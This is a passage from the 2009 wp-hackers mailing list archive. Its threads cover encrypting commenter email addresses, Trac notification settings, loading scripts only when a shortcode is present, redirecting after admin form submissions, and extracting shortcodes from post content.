supposition). You may wish people to be able to have truly anonymous 
discussions without the risk of exposing their identities should the 
server be compromised or confiscated.

That said, I am not aware of a plugin to do this, but it should not be 
hard to write one.

-- 
Dougal Campbell <dougal at gunters.org>
http://dougal.gunters.org/
http://twitter.com/dougal
http://twitual.com/

From peter.westwood at ftwr.co.uk  Sat Oct 24 07:18:18 2009
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Sat, 24 Oct 2009 08:18:18 +0100
Subject: [wp-hackers] Encrypting comment_author_IP,
	comment_author_email and user_email
In-Reply-To: <e4dc67e0910231020g2357f60cq5dd7b965c7672804@mail.gmail.com>
References: <e4dc67e0910231020g2357f60cq5dd7b965c7672804@mail.gmail.com>
Message-ID: <DDC79BDE-FB76-4B66-95ED-E46DE972ED9D@ftwr.co.uk>


On 23 Oct 2009, at 18:20, William Canino wrote:

> Hello,
>
> Has anyone heard of anyone writing a plugin that encrypts these three
> columns in the database level?
>
> a. $comment->comment_author_email, "SELECT comment_author_email FROM
> wp_comments" and "SELECT user_email FROM wp_users" will display
> gibberish.
>
> b. comment_author_email() will display gibberish unless a condition
> set in the plugin is true.
>

If you want to truly protect the address this is not possible!

> I would like assurance that someone who gains db access to the blog or
> get hold of a SQL dump cannot harvest email addresses.

You have a number of choices here:

Encrypt with a symmetric key algorithm so you can get the email  
address back temporarily when you need it - gravatar, checking  
comments are from same author etc.
The downside of this is you are adding a lot of extra computation to  
every page load and if someone gets access to the db it is likely they  
will also get access to steal the key and algorithm used too so you  
don't get much protection.
You also have the implementation cost of the crypto algorithm

Encrypt with a public-private key algorithm and don't have the private  
key on the server so you can only get the email address back offline  
where the private key exists. To handle gravatar you would have to  
cache the image locally yourself and replace the pluggable function.
To checking comments are from same author you would have to encrypt  
the incoming email address.
The downside of this is you have to do the caching of gravatars if you  
use them.
You also have the implementation cost of the crypto algorithm

Hash the email address using md5 - this is what is used to generate  
the gravatar url so you are alright there and load wise this should  
have little effect.
A plain md5 like this will be subject to the rainbow table worries and  
you would do better to use a salted md5 but then you will need to  
cache the gravatar image.
Using this method you can't get the email address back!

Hope this helps!
-- 
Peter Westwood
http://blog.ftwr.co.uk | http://westi.wordpress.com
C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5


From xavier at borderie.net  Sat Oct 24 13:31:39 2009
From: xavier at borderie.net (Xavier Borderie)
Date: Sat, 24 Oct 2009 15:31:39 +0200
Subject: [wp-hackers] Social Web Camp
In-Reply-To: <78B48D19-97AD-4601-AAA4-01F8B8AAB944@striderweb.com>
References: <7548B7A3-7B43-4D6B-9EE1-6BEA5E12553F@bblfish.net> 
	<9e4ae73e0910230533l7fde4689j5100af410e74e7f6@mail.gmail.com> 
	<78B48D19-97AD-4601-AAA4-01F8B8AAB944@striderweb.com>
Message-ID: <9e4ae73e0910240631p142b50banda25f63b88b7d753@mail.gmail.com>

>> Imagine a world where everybody could participate easily in a
>> distributed yet secure social web. In such a world people could place
>> their photos, music, or other content on their web site
>> and give access to some of it to their friends, some to their family,
>> the rest to their colleagues, and some even to the friends of their
>> friends...
>
> Isn't that called Facebook?

Indeed, but Facebook is a walled garden: centralized, proprietary,
big-brother-y, etc.
The solutions they aim to discuss about at this barcamp, such as
FOAF+SSL, are indeed interesting - I've seen a presentation at the
Paris-Web conference, and it was quite compelling.
http://esw.w3.org/topic/foaf+ssl
http://blogs.sun.com/bblfish/entry/foaf_ssl_adding_security_to
http://blogs.sun.com/bblfish/entry/the_foaf_ssl_paradigm_shift


-- 
Xavier Borderie

From william.canino at googlemail.com  Sat Oct 24 14:54:41 2009
From: william.canino at googlemail.com (William Canino)
Date: Sat, 24 Oct 2009 10:54:41 -0400
Subject: [wp-hackers] Encrypting comment_author_IP,
	comment_author_email 	and user_email
In-Reply-To: <DDC79BDE-FB76-4B66-95ED-E46DE972ED9D@ftwr.co.uk>
References: <e4dc67e0910231020g2357f60cq5dd7b965c7672804@mail.gmail.com>
	<DDC79BDE-FB76-4B66-95ED-E46DE972ED9D@ftwr.co.uk>
Message-ID: <e4dc67e0910240754u5ac7ef75l44a7360f5586cae1@mail.gmail.com>

> For example, if you live in an oppressive country
> where "Freedom of Speech" is not observed (and
> expressing opinions contrary to the government's
> can get you arrested, tortured, and killed

Yes, and remember guys that FoS only applies to governments. Blogging
about your employer can get you fired. Blogging about a private
individual or company can get you arrested, tortured and killed.  c.f.
the Godfather.

Thank you for your ideas, Peter and Matt. Douglas saw through my intentions.

Okay, anything sent to gravatar is unsalted md5 and is therefore
subject to rainbow tables.  My plugin must then have to cache them
locally, including fetching them as needed.  It's too much work and,
hey, does it even make sense to have gravatars when we are striving to
be anonymous? ;)

My big challenge right now for this plugin is that WordPress Core uses
"$comment->comment_author_email" in wild abandon.  A hook to
comment_author_email is worthless because nobody uses it. See
http://phpxref.ftwr.co.uk/wordpress/_variables/comment_author_email.html

I think PKI is the way to go. I mean, why even ask for his email
address in the comment form if you won't use it to send him emails?
However, for my plugin to be of any use to others, my plugin's users
will just have to edit their other plugins so as to call my plugin's
decryptor function.

Here is my follow-up question:  How about I put the private key and
the decryption on a separate website?  For example, the plugin's
decryptor function will ask http://secret.com/secret.php to decrypt
the database column data.  Secret.com and Blog.com will have each
other's private key. Will this work?

For performance, secret.php could have a cache of results.  Good idea?

W

2009/10/24 Peter Westwood <peter.westwood at ftwr.co.uk>:
>
> On 23 Oct 2009, at 18:20, William Canino wrote:
>
>> Hello,
>>
>> Has anyone heard of anyone writing a plugin that encrypts these three
>> columns in the database level?
>>
>> a. $comment->comment_author_email, "SELECT comment_author_email FROM
>> wp_comments" and "SELECT user_email FROM wp_users" will display
>> gibberish.
>>
>> b. comment_author_email() will display gibberish unless a condition
>> set in the plugin is true.
>>
>
> If you want to truly protect the address this is not possible!
>
>> I would like assurance that someone who gains db access to the blog or
>> get hold of a SQL dump cannot harvest email addresses.
>
> You have a number of choices here:
>
> Encrypt with a symmetric key algorithm so you can get the email address back
> temporarily when you need it - gravatar, checking comments are from same
> author etc.
> The downside of this is you are adding a lot of extra computation to every
> page load and if someone gets access to the db it is likely they will also
> get access to steal the key and algorithm used too so you don't get much
> protection.
> You also have the implementation cost of the crypto algorithm
>
> Encrypt with a public-private key algorithm and don't have the private key
> on the server so you can only get the email address back offline where the
> private key exists. To handle gravatar you would have to cache the image
> locally yourself and replace the pluggable function.
> To checking comments are from same author you would have to encrypt the
> incoming email address.
> The downside of this is you have to do the caching of gravatars if you use
> them.
> You also have the implementation cost of the crypto algorithm
>
> Hash the email address using md5 - this is what is used to generate the
> gravatar url so you are alright there and load wise this should have little
> effect.
> A plain md5 like this will be subject to the rainbow table worries and you
> would do better to use a salted md5 but then you will need to cache the
> gravatar image.
> Using this method you can't get the email address back!
>
> Hope this helps!
> --
> Peter Westwood
> http://blog.ftwr.co.uk | http://westi.wordpress.com
> C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From wp-hackers at striderweb.com  Sat Oct 24 18:10:34 2009
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Sat, 24 Oct 2009 13:10:34 -0500
Subject: [wp-hackers] Trac should not automatically CC commenters
Message-ID: <8BDF6F3A-B272-4E67-A160-F37ED94B16A6@striderweb.com>

Hi all --

I'm subscribed to the wp-trac list, and I sometimes comment or  
contribute to tickets.  When I do so, I'm sent an email every time  
there is another change to those tickets.  (I have NOT hit the "add to  
cc" button.)

This is really annoying, as I'm already getting those changes via wp- 
trac.  With the separate auto-CC I now receive two copies of every  
single change notice for every ticket I've touched.

Is there a way to change this behavior?  (And please don't say "just  
filter you email".  Yes I'm sure it can be done [though the emails are  
virtually identical], but that doesn't address misbehavior and a false  
assumption on the part of the Trac system.)

Stephen

From peter.westwood at ftwr.co.uk  Sat Oct 24 20:41:14 2009
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Sat, 24 Oct 2009 21:41:14 +0100
Subject: [wp-hackers] Trac should not automatically CC commenters
In-Reply-To: <8BDF6F3A-B272-4E67-A160-F37ED94B16A6@striderweb.com>
References: <8BDF6F3A-B272-4E67-A160-F37ED94B16A6@striderweb.com>
Message-ID: <BF0B5824-639A-49F4-BC2E-458BEC5EAFAC@ftwr.co.uk>


On 24 Oct 2009, at 19:10, Stephen Rider wrote:

> I'm subscribed to the wp-trac list, and I sometimes comment or  
> contribute to tickets.  When I do so, I'm sent an email every time  
> there is another change to those tickets.  (I have NOT hit the "add  
> to cc" button.)
>
> This is really annoying, as I'm already getting those changes via wp- 
> trac.  With the separate auto-CC I now receive two copies of every  
> single change notice for every ticket I've touched.
>
> Is there a way to change this behavior?  (And please don't say "just  
> filter you email".  Yes I'm sure it can be done [though the emails  
> are virtually identical], but that doesn't address misbehavior and a  
> false assumption on the part of the Trac system.)

As far as I know, you get these emails because you have configured as  
email address in your trac preferences - https://core.trac.wordpress.org/prefs

If you remove that I believe you will get no more emails.

I find this feature quite useful as it lets me filter the volume of  
email I receive from the WordPress trac into two separate folders -  
one for tickets I have shown a direct interest in and one for the  
firehose of every change which can at times get quite busy!

westi
-- 
Peter Westwood
http://blog.ftwr.co.uk | http://westi.wordpress.com
C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5


From admin at laptoptips.ca  Sat Oct 24 21:10:25 2009
From: admin at laptoptips.ca (Andrew Ozz)
Date: Sat, 24 Oct 2009 14:10:25 -0700
Subject: [wp-hackers] Trac should not automatically CC commenters
In-Reply-To: <BF0B5824-639A-49F4-BC2E-458BEC5EAFAC@ftwr.co.uk>
References: <8BDF6F3A-B272-4E67-A160-F37ED94B16A6@striderweb.com>
	<BF0B5824-639A-49F4-BC2E-458BEC5EAFAC@ftwr.co.uk>
Message-ID: <4AE36D41.4060108@laptoptips.ca>

Peter Westwood wrote:
> 
> On 24 Oct 2009, at 19:10, Stephen Rider wrote:
> 
>> I'm subscribed to the wp-trac list, and I sometimes comment or 
>> contribute to tickets.  When I do so, I'm sent an email every time 
>> there is another change to those tickets.  (I have NOT hit the "add to 
>> cc" button.)
>>
> 
> I find this feature quite useful as it lets me filter the volume of 
> email I receive from the WordPress trac into two separate folders - one 
> for tickets I have shown a direct interest in and one for the firehose 
> of every change which can at times get quite busy!

Same here. Pretty easy to sort different trac emails into different 
folders and keep track (heh) of every change.


From wp-hackers at striderweb.com  Sat Oct 24 23:23:45 2009
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Sat, 24 Oct 2009 18:23:45 -0500
Subject: [wp-hackers] Trac should not automatically CC commenters
In-Reply-To: <BF0B5824-639A-49F4-BC2E-458BEC5EAFAC@ftwr.co.uk>
References: <8BDF6F3A-B272-4E67-A160-F37ED94B16A6@striderweb.com>
	<BF0B5824-639A-49F4-BC2E-458BEC5EAFAC@ftwr.co.uk>
Message-ID: <C3E548B8-2FDC-454E-A8D6-F9F0470DF994@striderweb.com>

On Oct 24, 2009, at 3:41 PM, Peter Westwood wrote:

> On 24 Oct 2009, at 19:10, Stephen Rider wrote:
>
>> I'm subscribed to the wp-trac list, and I sometimes comment or  
>> contribute to tickets.  When I do so, I'm sent an email every time  
>> there is another change to those tickets.  (I have NOT hit the "add  
>> to cc" button.)
>
> As far as I know, you get these emails because you have configured  
> as email address in your trac preferences - https://core.trac.wordpress.org/prefs
>
> If you remove that I believe you will get no more emails.

Done.  Thanks.

> I find this feature quite useful as it lets me filter the volume of  
> email I receive from the WordPress trac into two separate folders -  
> one for tickets I have shown a direct interest in and one for the  
> firehose of every change which can at times get quite busy!

Eh.  Threaded email, and I flag the threads I'm interested in. :)

Stephen

From aaron at xavisys.com  Sun Oct 25 01:02:26 2009
From: aaron at xavisys.com (Aaron D. Campbell)
Date: Sat, 24 Oct 2009 18:02:26 -0700
Subject: [wp-hackers] checking if post has shortcode,
 before header is 	output?
In-Reply-To: <349fe48b0910231602n65464a73yd8f95c4f9a2d7b74@mail.gmail.com>
References: <4AE226CA.1050002@unFocus.com>
	<349fe48b0910231602n65464a73yd8f95c4f9a2d7b74@mail.gmail.com>
Message-ID: <4AE3A3A2.4070106@xavisys.com>

That won't work for any custom queries (as well as a few other edge 
cases like [[your_shortcode), but it'll work for most scenarios.  You 
could also have your shortcode handler add an action that hooks into 
wp_footer and uses wp_print_scripts() to load your js file.  You get the 
benefit of the js loading in the footer as well as the functionality you 
wanted of only loading your js when needed.


scribu wrote:
> Try this:
>
> add_action('template_redirect', 'add_scripts');
>
> function add_scripts() {
> if ( ! is_page() )
> return;
>
> global $posts;
>
> if ( FALSE === strpos($posts[0]->post_content, '[your_shortcode') )
> return;
>
> wp_enqueue_script(...
> }
>
>
>   


From if.website at gmail.com  Sun Oct 25 01:14:19 2009
From: if.website at gmail.com (Austin Matzko)
Date: Sat, 24 Oct 2009 20:14:19 -0500
Subject: [wp-hackers] checking if post has shortcode,
	before header is 	output?
In-Reply-To: <349fe48b0910231602n65464a73yd8f95c4f9a2d7b74@mail.gmail.com>
References: <4AE226CA.1050002@unFocus.com>
	<349fe48b0910231602n65464a73yd8f95c4f9a2d7b74@mail.gmail.com>
Message-ID: <674b4a3b0910241814x478bcf82ibf50b10f55f2c014@mail.gmail.com>

On Fri, Oct 23, 2009 at 6:02 PM, scribu <scribu at gmail.com> wrote:
> Try this:
>
> add_action('template_redirect', 'add_scripts');
>
> function add_scripts() {
> if ( ! is_page() )
> return;
>
> global $posts;
>
> if ( FALSE === strpos($posts[0]->post_content, '[your_shortcode') )
> return;

Rather than checking the global $posts variable, I'd recommend using
the WP_Query API:

add_action('template_redirect', 'add_scripts');
function add_scripts() {
   global $wp_query;
   if ( is_singular() ) {
      $post = $wp_query->get_queried_object();
      if ( false !== strpos($post->post_content, '[your_shortcode') ) {
         wp_enqueue_script(...
      }
   }
}

From websweetweb at gmail.com  Sun Oct 25 03:37:42 2009
From: websweetweb at gmail.com (raj)
Date: Sun, 25 Oct 2009 09:07:42 +0530
Subject: [wp-hackers] Redirecting Users In Admin To Avoid Resubmitting
	Information
Message-ID: <4AE3C806.4010002@gmail.com>

I am creating a simple create, edit, update, delete [something] 
wordpress plugin.
In the create screen, the user inserts something in the database and is 
sent to the
confirmation message. But the data gets inserted again if the user 
refreshes the page.

How do you handle this? How do you 'redirect' users to a different
location such that once they get there, the action shouldn't be
performed again if they refresh that page. I have tried using a
javascript redirect to send the user to the confirmation page but this 
method
loads the administration menu items before executing the javascript.

I would like to know:

1. If there is anyway to send javascript output in the body before any
of the wordpress administration interface code is sent to the browser.
2. If it is possible to do this without javascript, if so how?

Raj Sekharan


From if.website at gmail.com  Sun Oct 25 03:46:13 2009
From: if.website at gmail.com (Austin Matzko)
Date: Sat, 24 Oct 2009 22:46:13 -0500
Subject: [wp-hackers] Redirecting Users In Admin To Avoid Resubmitting
	Information
In-Reply-To: <4AE3C806.4010002@gmail.com>
References: <4AE3C806.4010002@gmail.com>
Message-ID: <674b4a3b0910242046u5f0ab05an9cfe74714d0c31ae@mail.gmail.com>

On Sat, Oct 24, 2009 at 10:37 PM, raj <websweetweb at gmail.com> wrote:
> I am creating a simple create, edit, update, delete [something] wordpress
> plugin.
> In the create screen, the user inserts something in the database and is sent
> to the
> confirmation message. But the data gets inserted again if the user refreshes
> the page.
>
> How do you handle this? How do you 'redirect' users to a different
> location such that once they get there, the action shouldn't be
> performed again if they refresh that page.

Do what core WP does: perform the data operations before the page is
printed (say on the "admin_init" action or the like), and then use
wp_redirect() to redirect to a page with an argument that specifies
the message to show.

For example, after submitting the Settings > General page, one is
redirected to wp-admin/options-general.php?updated=true, and that
"updated" $_GET parameter is detected and the message "Settings
saved." printed.

From acidosen at googlemail.com  Mon Oct 26 01:13:06 2009
From: acidosen at googlemail.com (Pawel Duda)
Date: Mon, 26 Oct 2009 02:13:06 +0100
Subject: [wp-hackers] UML Specification of WordPress
Message-ID: <8fcff1390910251813w2f928d76s1beb5b22ebf0e7a3@mail.gmail.com>

Hello,
I was wondering if there's any UML specification of Wordpress?

Pawel

From jwriteclub at gmail.com  Mon Oct 26 01:23:38 2009
From: jwriteclub at gmail.com (Christopher O'Connell)
Date: Sun, 25 Oct 2009 18:23:38 -0700
Subject: [wp-hackers] UML Specification of WordPress
In-Reply-To: <8fcff1390910251813w2f928d76s1beb5b22ebf0e7a3@mail.gmail.com>
References: <8fcff1390910251813w2f928d76s1beb5b22ebf0e7a3@mail.gmail.com>
Message-ID: <81d01c0910251823j125f29fewfc6760902f762b3c@mail.gmail.com>

Giggle!

~ Christopher

On Sun, Oct 25, 2009 at 6:13 PM, Pawel Duda <acidosen at googlemail.com> wrote:

> Hello,
> I was wondering if there's any UML specification of Wordpress?
>
> Pawel
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From hypecreations at gmail.com  Mon Oct 26 05:31:30 2009
From: hypecreations at gmail.com (Eric Holmstrom)
Date: Mon, 26 Oct 2009 16:31:30 +1100
Subject: [wp-hackers] Hooking into Post -> Edit Screen
Message-ID: <acc04ddf0910252231y33a3a35ay8eccf18d332d0eab@mail.gmail.com>

Hi All,

Is it possible to hook into the admin post -> edit screen and add text under
the post title but above the Edit | Quick Edit | Delete | View? I have
include an image below which illustrates what I'm trying to achieve.

http://img5.imageshack.us/img5/1460/ashec.jpg

From william.canino at googlemail.com  Mon Oct 26 06:37:40 2009
From: william.canino at googlemail.com (William Canino)
Date: Mon, 26 Oct 2009 02:37:40 -0400
Subject: [wp-hackers] Hooking into Post -> Edit Screen
In-Reply-To: <acc04ddf0910252231y33a3a35ay8eccf18d332d0eab@mail.gmail.com>
References: <acc04ddf0910252231y33a3a35ay8eccf18d332d0eab@mail.gmail.com>
Message-ID: <e4dc67e0910252337y1d3133dbib1001c726b317159@mail.gmail.com>

Eric,

You cannot change what's displayed for the default columns, but you
can remove the title column and add a custom one of your own.

Add a filter for 'manage_posts_columns' to customize the columns, then
add an action to 'manage_posts_custom_column' to handle the column you
added.

http://wordpress.taragana.net/nav.html?wp-admin/edit.php.source.html

W

2009/10/26 Eric Holmstrom <hypecreations at gmail.com>:
> Hi All,
>
> Is it possible to hook into the admin post -> edit screen and add text under
> the post title but above the Edit | Quick Edit | Delete | View? I have
> include an image below which illustrates what I'm trying to achieve.
>
> http://img5.imageshack.us/img5/1460/ashec.jpg
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From jeremy at visser.name  Mon Oct 26 08:19:14 2009
From: jeremy at visser.name (Jeremy Visser)
Date: Mon, 26 Oct 2009 19:19:14 +1100
Subject: [wp-hackers] UML Specification of WordPress
In-Reply-To: <8fcff1390910251813w2f928d76s1beb5b22ebf0e7a3@mail.gmail.com>
References: <8fcff1390910251813w2f928d76s1beb5b22ebf0e7a3@mail.gmail.com>
Message-ID: <1256545154.3429.12.camel@rillian.narnia.sunriseroad.net>

On Mon, 2009-10-26 at 02:13 +0100, Pawel Duda wrote:
> I was wondering if there's any UML specification of Wordpress?

No, sorry. And I doubt there are any PHP projects that do.

What do you want one for? And what would it do that an XRef API
reference wouldn't?


From cjscott69 at gmail.com  Mon Oct 26 11:57:50 2009
From: cjscott69 at gmail.com (Chris Scott)
Date: Mon, 26 Oct 2009 07:57:50 -0400
Subject: [wp-hackers] checking if post has shortcode,
	before header is 	output?
In-Reply-To: <4AE3A3A2.4070106@xavisys.com>
References: <4AE226CA.1050002@unFocus.com>
	<349fe48b0910231602n65464a73yd8f95c4f9a2d7b74@mail.gmail.com>
	<4AE3A3A2.4070106@xavisys.com>
Message-ID: <469fb3cc0910260457v2f4d53caxd59fe9c52d3d67a6@mail.gmail.com>

On Sat, Oct 24, 2009 at 9:02 PM, Aaron D. Campbell <aaron at xavisys.com> wrote:
> That won't work for any custom queries (as well as a few other edge cases
> like [[your_shortcode), but it'll work for most scenarios. ?You could also
> have your shortcode handler add an action that hooks into wp_footer and uses
> wp_print_scripts() to load your js file. ?You get the benefit of the js
> loading in the footer as well as the functionality you wanted of only
> loading your js when needed.

To prevent the edge cases you can use get_shortcode_regex() to know
that you are checking for the shortcode the same way wp is. Something
like this:

$pattern = get_shortcode_regex();
preg_match('/'.$pattern.'/s', $posts[0]->post_content, $matches);
if (is_array($matches) && $matches[2] == 'YOURSHORTCODE') {
	//shortcode is being used
}


--
Chris Scott
http://iamzed.com/
http://hailtheale.com/

>
>
> scribu wrote:
>>
>> Try this:
>>
>> add_action('template_redirect', 'add_scripts');
>>
>> function add_scripts() {
>> if ( ! is_page() )
>> return;
>>
>> global $posts;
>>
>> if ( FALSE === strpos($posts[0]->post_content, '[your_shortcode') )
>> return;
>>
>> wp_enqueue_script(...
>> }
>>
>>
>>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From navjotjsingh at gmail.com  Mon Oct 26 12:12:16 2009
From: navjotjsingh at gmail.com (Navjot Singh)
Date: Mon, 26 Oct 2009 17:42:16 +0530
Subject: [wp-hackers] Show only Shortcodes in Sidebar
Message-ID: <7b9e108c0910260512w6e3b8a29t21f05e5b5e3f03c2@mail.gmail.com>

I have a blog where in sidebar, I need to fetch posts belonging to video
category. Now Videos are embedded using shortcodes. But since the_content is
used to show the posts in sidebar, any text and even image in a video post
gets shown in sidebar which makes it messy.

How to filter the_content so that only shortcodes display in that sidebar
and rest of content gets filtered out? I am noob with regular expressions
and such stuff.

Regards

Navjot Singh

From skeltoac at gmail.com  Mon Oct 26 12:16:07 2009
From: skeltoac at gmail.com (Andy Skelton)
Date: Mon, 26 Oct 2009 07:16:07 -0500
Subject: [wp-hackers] Show only Shortcodes in Sidebar
In-Reply-To: <7b9e108c0910260512w6e3b8a29t21f05e5b5e3f03c2@mail.gmail.com>
References: <7b9e108c0910260512w6e3b8a29t21f05e5b5e3f03c2@mail.gmail.com>
Message-ID: <e6ec604d0910260516m26d2e5e0xbeb9c80f9713944a@mail.gmail.com>

> How to filter the_content so that only shortcodes display in that sidebar
> and rest of content gets filtered out?

$content = strip_shortcodes($post->post_content);

Andy

From navjotjsingh at gmail.com  Mon Oct 26 12:19:46 2009
From: navjotjsingh at gmail.com (Navjot Singh)
Date: Mon, 26 Oct 2009 17:49:46 +0530
Subject: [wp-hackers] Show only Shortcodes in Sidebar
In-Reply-To: <e6ec604d0910260516m26d2e5e0xbeb9c80f9713944a@mail.gmail.com>
References: <7b9e108c0910260512w6e3b8a29t21f05e5b5e3f03c2@mail.gmail.com> 
	<e6ec604d0910260516m26d2e5e0xbeb9c80f9713944a@mail.gmail.com>
Message-ID: <7b9e108c0910260519t69cc4780ub16d8acb3067ad2d@mail.gmail.com>

This does the reverse. It removes the shortcodes. I want to display the
shortcodes only and anything except shortcodes should be filtered out.

Sent from Delhi, DL, India

On Mon, Oct 26, 2009 at 5:46 PM, Andy Skelton <skeltoac at gmail.com> wrote:

> > How to filter the_content so that only shortcodes display in that sidebar
> > and rest of content gets filtered out?
>
> $content = strip_shortcodes($post->post_content);
>
> Andy
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From skeltoac at gmail.com  Mon Oct 26 12:33:58 2009
From: skeltoac at gmail.com (Andy Skelton)
Date: Mon, 26 Oct 2009 07:33:58 -0500
Subject: [wp-hackers] Show only Shortcodes in Sidebar
In-Reply-To: <7b9e108c0910260519t69cc4780ub16d8acb3067ad2d@mail.gmail.com>
References: <7b9e108c0910260512w6e3b8a29t21f05e5b5e3f03c2@mail.gmail.com>
	<e6ec604d0910260516m26d2e5e0xbeb9c80f9713944a@mail.gmail.com>
	<7b9e108c0910260519t69cc4780ub16d8acb3067ad2d@mail.gmail.com>
Message-ID: <e6ec604d0910260533u46d2a657s7e22ecd813de6929@mail.gmail.com>

>> > How to filter the_content so that only shortcodes display in that sidebar
>> > and rest of content gets filtered out?
>>
>> $content = strip_shortcodes($post->post_content);
>>
> This does the reverse. It removes the shortcodes. I want to display the
> shortcodes only and anything except shortcodes should be filtered out.

Sorry, I flipped a bit. Look at the source for strip_shortcodes. It
gets the regex pattern from get_shortcode_regex(). You can use that in
preg_replace. Something like this extempore and untested snippet:

$pattern = get_shortcode_regex();
$pattern = str_replace('(.?)', '', $pattern);
$pattern = str_replace('2', '3', $pattern);
$content = $post->post_content;
$shortcodes = preg_replace("/.*($pattern).*?/s", '$1', $content);

Andy

From navjotjsingh at gmail.com  Mon Oct 26 12:39:48 2009
From: navjotjsingh at gmail.com (Navjot Singh)
Date: Mon, 26 Oct 2009 18:09:48 +0530
Subject: [wp-hackers] Show only Shortcodes in Sidebar
In-Reply-To: <e6ec604d0910260533u46d2a657s7e22ecd813de6929@mail.gmail.com>
References: <7b9e108c0910260512w6e3b8a29t21f05e5b5e3f03c2@mail.gmail.com> 
	<e6ec604d0910260516m26d2e5e0xbeb9c80f9713944a@mail.gmail.com> 
	<7b9e108c0910260519t69cc4780ub16d8acb3067ad2d@mail.gmail.com> 
	<e6ec604d0910260533u46d2a657s7e22ecd813de6929@mail.gmail.com>
Message-ID: <7b9e108c0910260539n1a9aeb64ndc523843974e409e@mail.gmail.com>

Thnx, this code does show the shortcodes, but how to reparse the shortcodes.
Afterall I want the shortcodes values (i.e. the videos) to show in sidebar.
do_shortcode($shortcodes) does not help.

Sent from Delhi, DL, India

On Mon, Oct 26, 2009 at 6:03 PM, Andy Skelton <skeltoac at gmail.com> wrote:

> >> > How to filter the_content so that only shortcodes display in that
> sidebar
> >> > and rest of content gets filtered out?
> >>
> >> $content = strip_shortcodes($post->post_content);
> >>
> > This does the reverse. It removes the shortcodes. I want to display the
> > shortcodes only and anything except shortcodes should be filtered out.
>
> Sorry, I flipped a bit. Look at the source for strip_shortcodes. It
> gets the regex pattern from get_shortcode_regex(). You can use that in
> preg_replace. Something like this extempore and untested snippet:
>
> $pattern = get_shortcode_regex();
> $pattern = str_replace('(.?)', '', $pattern);
> $pattern = str_replace('2', '3', $pattern);
> $content = $post->post_content;
> $shortcodes = preg_replace("/.*($pattern).*?/s", '$1', $content);
>
> Andy
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From gaarai at gaarai.com  Mon Oct 26 12:43:28 2009
From: gaarai at gaarai.com (Chris Jean)
Date: Mon, 26 Oct 2009 07:43:28 -0500
Subject: [wp-hackers] Show only Shortcodes in Sidebar
In-Reply-To: <e6ec604d0910260533u46d2a657s7e22ecd813de6929@mail.gmail.com>
References: <7b9e108c0910260512w6e3b8a29t21f05e5b5e3f03c2@mail.gmail.com>	<e6ec604d0910260516m26d2e5e0xbeb9c80f9713944a@mail.gmail.com>	<7b9e108c0910260519t69cc4780ub16d8acb3067ad2d@mail.gmail.com>
	<e6ec604d0910260533u46d2a657s7e22ecd813de6929@mail.gmail.com>
Message-ID: <4AE59970.8040507@gaarai.com>

Looks like Andy beat me to the punch, but here's my solution just in 
case it helps:

    add_filter( 'the_content', 'just_shortcodes' );

    function just_shortcodes( $content ) {
        global $shortcode_tags;
       
        $tagnames = array_keys( $shortcode_tags );
    //  $tagnames = array( 'video_shortcode' );
       
        $tagregexp = join( '|', array_map( 'preg_quote', $tagnames ) );
       
        $regex = '\[('.$tagregexp.')\b(.*?)(?:(\/))?\](?:(.+?)\[\/\2\])?';
       
       
        preg_match_all( '/' . $regex . '/s', $content, $matches,
    PREG_PATTERN_ORDER );
       
        return implode( '', $matches[0] );
    }

I yanked most of this code from the get_shortcode_regex function in 
wp-includes/shortcodes.php.

There are a few things of note here:

   1. This is built as a filter, so all you have to do is use the
      add_filter call before your sidebar code and then run
      remove_filter( 'the_content', 'just_shortcodes' ) after the
      sidebar code to return the_content calls to normal.
   2. Since the $tagnames array is built inside the filter function, you
      can tailor it to your needs to only include those shortcodes that
      you wish to display. I show this with the commented out line that
      manually sets the array. If you use this method, simply remove the
      line above it as it is no longer needed.
   3. The shortcodes are just slapped together with no spacing,
      newlines, or breaks between them. You can change this by supplying
      a different divider string in the first argument of the implode
      function.

I hope this helps.

Chris Jean
http://gaarai.com/
http://wp-roadmap.com/



Andy Skelton wrote:
>>>> How to filter the_content so that only shortcodes display in that sidebar
>>>> and rest of content gets filtered out?
>>>>         
>>> $content = strip_shortcodes($post->post_content);
>>>
>>>       
>> This does the reverse. It removes the shortcodes. I want to display the
>> shortcodes only and anything except shortcodes should be filtered out.
>>     
>
> Sorry, I flipped a bit. Look at the source for strip_shortcodes. It
> gets the regex pattern from get_shortcode_regex(). You can use that in
> preg_replace. Something like this extempore and untested snippet:
>
> $pattern = get_shortcode_regex();
> $pattern = str_replace('(.?)', '', $pattern);
> $pattern = str_replace('2', '3', $pattern);
> $content = $post->post_content;
> $shortcodes = preg_replace("/.*($pattern).*?/s", '$1', $content);
>
> Andy
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>   

From ceo at kettlewell.net  Mon Oct 26 14:51:44 2009
From: ceo at kettlewell.net (Matthew Kettlewell)
Date: Mon, 26 Oct 2009 07:51:44 -0700
Subject: [wp-hackers] Multiple Instances of the_editor()?
Message-ID: <4AE5B780.7090805@kettlewell.net>

Is there an easy way to have multiple instances of the_editor() on an 
admin page?

I've got them displaying, but the link from visual to HTML and back 
quits working

I call the_editor() as follows:

the_editor($some_content1, 'content1'...);
the_editor($some_content2, 'content2'...);

So each is in it's own textarea with it's own id for switchEditor,

But it seems that the switchEditor() call is getting confused somehow.

I'm not a huge js knowlegebase yet, so I'm not exactly sure of what to 
look for...

